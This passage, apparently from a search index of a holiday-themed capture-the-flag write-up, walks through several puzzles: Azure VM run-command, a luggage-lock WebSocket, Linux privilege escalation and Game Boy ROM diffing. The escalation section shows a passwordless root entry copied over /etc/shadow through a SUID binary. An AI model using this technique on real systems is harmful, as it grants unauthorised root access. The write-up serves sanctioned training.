\"NP-VM1\",\n    \"properties\": {\n    \"hardwareProfile\": {\n        \"vmSize\": \"Standard_D2s_v3\"\n    },\n    \"provisioningState\": \"Succeeded\",\n    \"storageProfile\": {\n        \"imageReference\": {\n        \"offer\": \"UbuntuServer\",\n        \"publisher\": \"Canonical\",\n        \"sku\": \"16.04-LTS\",\n        \"version\": \"latest\"\n        },\n        \"osDisk\": {\n        \"caching\": \"ReadWrite\",\n        \"createOption\": \"FromImage\",\n        \"managedDisk\": {\n            \"storageAccountType\": \"Standard_LRS\"\n        },\n        \"name\": \"VM1_OsDisk_1\"\n        }\n    },\n    \"vmId\": \"e5f16214-18be-4a31-9ebb-2be3a55cfcf7\"\n    },\n    \"resourceGroup\": \"northpole-rg2\",\n    \"tags\": {}\n}\n]\n</code></pre> <p>!!! question \"Q6. Find a way to invoke a run-command against the only Virtual Machine (VM) so you can RunShellScript and get a directory listing to reveal a file on the Azure VM. For more information:\"     <pre><code>az vm run-command invoke -g northpole-rg2 -n NP-VM1 --command-id RunShellScript --scripts \"ls -la\" \n</code></pre>     !!! success \"Output\"     <pre><code>{\n\"value\": [\n    {\n    \"code\": \"ComponentStatus/StdOut/succeeded\",\n    \"displayStatus\": \"Provisioning succeeded\",\n    \"level\": \"Info\",\n    \"message\": \"total 52\\ndrwxr-x--- 1 0 0 4096 Dec  4 20:38 .\\ndrwxr-x--- 1 0 0 4096 Dec  4 20:38 ..\\ndrwxr-x--- 1 0 0 4096 Dec  4 20:37 bin\\ndrwxr-xr-x 1 0 0 4096 Dec  4 20:38 etc\\ndrwxr-x--- 1 0 0 4096 Dec  2 22:16 home\\n-rwxr-x--- 1 0 0    0 Dec  4 20:37 jinglebells\\ndrwxr-xr-x 1 0 0 4096 Dec  4 20:37 lib\\ndrwxr-xr-x 1 0 0 4096 Dec  4 20:37 lib64\\ndrwxr-xr-x 1 0 0 4096 Dec  4 20:37 usr\\n\",\n    \"time\": 1703761045\n    },\n    {\n    \"code\": \"ComponentStatus/StdErr/succeeded\",\n    \"displayStatus\": \"Provisioning succeeded\",\n    \"level\": \"Info\",\n    \"message\": \"\",\n    \"time\": 1703761045\n    }\n]\n}\n</code></pre></p> <p>Once completed, we can close terminal!</p> <p></p>"},{"location":"objectives/o5/#response","title":"Response","text":"<p>Sparkle Redberry</p> <p>Wow, you did it!</p>"},{"location":"objectives/o6/","title":"Luggage Lock","text":"<p>Difficulty:  Direct link: Objective URL</p>"},{"location":"objectives/o6/#objective","title":"Objective","text":"<p>Request</p> <p>Help Garland Candlesticks on the Island of Misfit Toys get back into his luggage by finding the correct position for all four dials</p> Garland Candlesticks <p>Hey there, I'm Garland Candlesticks! I could really use your help with something. You see, I have this important pamphlet in my luggage, but I just can't remember the combination to open it!</p>"},{"location":"objectives/o6/#hints","title":"Hints","text":"Chris Elgee's talk <p>Check out Chris Elgee's talk regarding his and his wife's luggage. Sounds weird but interesting! https://youtu.be/ycM1hBSEyog</p>"},{"location":"objectives/o6/#solution","title":"Solution","text":"<p>Upon reviewing the instructional material provided by Chris's video, our initial approach started with rotating numbers on first position. After putting pressure on open button we are looking for resistance in rotation. Whenever we find resistance on given number we continute adding pressure and hoping onto next position to find opening combination. We should also listen carefully to sounds which might help us finding right combination.</p> <p>Once we inspected web application we were able to  spot WebSocket communication as well.</p> <pre><code>42[\"message\",{\"Type\":\"Open\",\"Combo\":\"7371\"}]\n\nAfter finding special combination we received WS message from server as below:\n\n42[\"message\",{\"Type\":\"Open\",\"Success\":\"True\",\"Token\":{\"hash\":\"63867c655eaa6469bb28a62688c4e1b7ec0c435ef8ee67d9cf24cac953b8148d\",\"resourceId\":\"5353ac49-2534-4de6-b8ed-9ef09dd76289\"},\"PlayerId\":\"5353ac49-2534-4de6-b8ed-9ef09dd76289\"}]\n</code></pre> <p></p> <p></p>"},{"location":"objectives/o6/#response","title":"Response","text":"<p>Answer</p> <p>42[\"message\",{\"Type\":\"Open\",\"Success\":\"True\",\"Token\":{\"hash\":\"63867c655eaa6469bb28a62688c4e1b7ec0c435ef8ee67d9cf24cac953b8148d\",\"resourceId\":\"5353ac49-2534-4de6-b8ed-9ef09dd76289\"},\"PlayerId\":\"5353ac49-2534-4de6-b8ed-9ef09dd76289\"}]</p> <p>Garland Candlesticks</p> <p>Wow, you did it! I knew you could crack the code. Thank you so much!</p>"},{"location":"objectives/o7/","title":"Linux PrivEsc","text":"<p>Difficulty:  Direct link: Objective URL</p>"},{"location":"objectives/o7/#objective","title":"Objective","text":"<p>Request</p> <p>Rosemold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands.</p> Rose Mold <p>What am I doing in this saloon? The better question is: what planet are you from? Yes, I\u2019m a troll from the Planet Frost. I decided to stay on Earth after Holiday Hack 2021 and live among the elves because I made such dear friends here.</p>"},{"location":"objectives/o7/#hints","title":"Hints","text":"Linux Privilege Escalation Techniques <p>There's various ways to escalate privileges on a Linux system.https://payatu.com/blog/a-guide-to-linux-privilege-escalation/</p> Linux Command Injection <p>Use the privileged binary to overwriting a file to escalate privileges could be a solution, but there's an easier method if you pass it a crafty argument..</p>"},{"location":"objectives/o7/#solution","title":"Solution","text":"<p>Upon obtaining console access to the terminal, we started exploring interesting files on filesystem</p> <pre><code>find / -perm -u+s 2&gt;/dev/null\n</code></pre> <p>And we found binary /usr/bin/simplecopy . This binary can copy any file from the system even with root permission. So the plan was to take over root permissions.</p> <p>Next we checked directory /etc/shadow for its structure. Create simple sh2 file with root account without password.</p> <pre><code>echo -e \"root::19634:0:99999:7:::\" &gt; sh2\n</code></pre> <p>Next using simplecopy binary we modified /etc/shadow file and from now \"su\" did not require any password so we could freely use root account</p> <pre><code> simplecopy sh2 /etc/shadow\n su\n</code></pre>"},{"location":"objectives/o7/#images","title":"Images","text":"<p>Answer</p> <p>\"santa\"</p>"},{"location":"objectives/o7/#response","title":"Response","text":"<p>Rose Mold</p> <p>Yup, I knew you knew. You just have that vibe.</p>"},{"location":"objectives/o8/","title":"Insert Game Cartridges: Vol 1","text":"<p>Difficulty:  Direct link: Objective 8 Terminal</p>"},{"location":"objectives/o8/#objective","title":"Objective","text":"<p>Request</p> <p>Find the first Gamegosling cartridge and beat the game</p> Dusty Giftwrap <p>The name's Angel Candysalt, the great treasure hunter! A euphemism? No, why do people always ask me that?? Anyways, I came here to nab the treasure hidden in this ship graveyard, only to discover it's protected by this rusted maze. That must be why all these old ships are here. Their crew came to find the treasure, only to get lost in the labrynth.</p>"},{"location":"objectives/o8/#hints","title":"Hints","text":"Buried Treasures <p>There are 3 buried treasures in total, each in its own uncharted area around Geese Islands. Use the gameboy cartridge detector and listen for the sound it makes when treasure is nearby, which gets louder the closer you are. Also look for some kind of distinguishing mark or feature, which could mark the treasure's location.</p> Gameboy1 <p>Giving things a little push never hurts. 2) Out of sight but not out of ear-shot 3) You think you fixed the QR code? Did you scan it and see where it leads?</p>"},{"location":"objectives/o8/#solution","title":"Solution","text":"<p>First of all we have been equiped with Game Boy Cartridge Detector which was helping us out on finding locations of gameboy cartridges.</p> <p></p> <p>We found first cartridge on Tarnished Trove, Island of Misfit Toys.</p> <p></p> <p>Game was accessible from Items menu after clicking on avatar. </p> <p></p> <p>Using arrow keys we had to move hidden boxes into highligted spots to fix QR Code. To be able to spot moveable object we had to shoot using music.</p> <p></p> <p>Once we moved all 7 boxes we have succesully completed a game. One of the boxes were a bit far away compared to the rest.</p> <p></p>"},{"location":"objectives/o8/#response","title":"Response","text":"<p>Dusty Giftwrap</p> <p>Whoa, you found it! It's a... video game cartridge? Coooooollll... I mean, arrrrrr....</p>"},{"location":"objectives/o9/","title":"Insert Game Cartridges: Vol 2","text":"<p>Difficulty:  Direct link: Objective Game0.gb</p>"},{"location":"objectives/o9/#objective","title":"Objective","text":"<p>Request</p> <p>Find the second Gamegosling cartridge and beat the game</p> Tinsel Upatree <p>I can't believe I was actually able to find this underground cavern! I discovered what looked liike an old pirate map in the attic of one of those huts in Rainraster Cliffs, and it actually led somewhere! But now that I've seen where it leads, I think this might've been a bad idea. This place is scary! Maybe you want to take it from here?</p>"},{"location":"objectives/o9/#hints","title":"Hints","text":"Gameboy 2 <p>1) This feels the same, but different! 2) If it feels like you are going crazy, you probably are! Or maybe, just maybe, you've not yet figured out where the hidden ROM is hiding. 3) I think I may need to get a DIFFerent perspective. 4) I wonder if someone can give me a few pointers to swap.</p> Gameboy 2 <p>Try poking around Pixel Island. There really aren't many places you can go here, so try stepping everywhere and see what you get!</p>"},{"location":"objectives/o9/#solution","title":"Solution","text":"<p>We have been informed that two versions of the game are available, and the game can also be accessed through a badge.</p> Tip <p>Tinsel Upatree: Did you know that many games had multiple versions released? Word is: volume 2 has 2 versions!</p> <p></p> <p>Once we started playing game we found a place where we couldn't pass and T-wiz force was not letting us through!</p> <p></p> <p>Quickly looking into Network console we found a gameboy ROM which could be downloaded. </p> <p>https://gamegosling.com/vol2-akHB27gg6pN0/rom/game0.gb </p> <p>There was mentioned second version under same URL with game1.gb name.</p> <p>https://gamegosling.com/vol2-akHB27gg6pN0/rom/game1.gb</p> <p>AS next step we loaded both GB files using Game Boy Advance emulator. We can see each version of the game situate us on different location.</p> <p></p> <p>To look deeper into the GB features we inspected images using Hex editor \"HxD Hex Editor.exe\"</p> <p></p> <p>To also make it more visible we can use XXD and diff linux tools to find interesting bits: <pre><code>lukasz@DESKTOP-4DU5JIH:/mnt/d/code/gb$ xxd game1.gb &gt;1\nlukasz@DESKTOP-4DU5JIH:/mnt/d/code/gb$ diff 0 1\n21c21\n&lt; 00000140: 0000 0000 3030 001b 0203 0033 0142 71b3  ....00.....3.Bq.\n---\n&gt; 00000140: 0000 0000 3030 001b 0203 0033 0142 7186  ....00.....3.Bq.\n90c90\n&lt; 00000590: 5405 050b 4b9a 2300 0000 0000 06ad 4210  T...K.#.......B.\n---\n&gt; 00000590: 5405 05d2 ac3d 2d00 0000 0000 06ad 4210  T....=-.......B.\n5801c5801\n&lt; 00016a80: 2080 0c80 0300 000f f807 0000 0000 0f10   ...............\n---\n&gt; 00016a80: 2080 0c80 0b00 000f f807 0000 0000 0f10   ...............\n5804c5804\n&lt; 00016ab0: 0000 0000 2000 0600 0900 000f f807 0000  .... ...........\n---\n&gt; 00016ab0: 0000 0000 2000 0600 0600 000f f807 0000  .... ...........\n6089c6089\n&lt; 00017c80: 0200 fe80 002a 0013 fffe fffb 13ff ffff  .....*..........\n---\n&gt; 00017c80: 0100 fe80 002a 0013 fffe fffb 13ff ffff  .....*..........\n6225,6226c6225,6226\n&lt; 00018500: 1204 2103 c60d 5701 1400 00ff fc14 0280  ..!...W.........\n&lt; 00018510: fffd 140b 80ff fe35 fffc 3200 fffc 2703  .......5..2...'.\n---\n&gt; 00018500: 1204 2103 c60d 5701 1400 00ff fc14 0300  ..!...W.........\n&gt; 00018510: fffd 1404 00ff fe35 fffc 3200 fffc 2703  .......5..2...'.\n</code></pre></p> <p>Offset 18515 is interesting point where data manipulation gives us possiblity to spawn character in different location.</p> <p></p> <p></p> <p>Here we need to enable sound and listen to radio transmission in morse code which translates to our answer GL0RY :)</p> <pre><code>MORSE CODE:\n--. .-.. ----- .-. -.--\n</code></pre> <p>Answer</p> <p>GL0RY</p>"},{"location":"objectives/o9/#response","title":"Response","text":"<p>Tinsel Upatree</p> <p>At least it's obvious where this one is. See that shiny spot over to the right? That's gotta be where it is! If only I had a bird's eye view. But how to get there? Up? Down? Left? Right? Oh well, that's your problem now! Come back if you can find your way to it, and I'll tell you some secrets I've heard about this one.</p>"}]}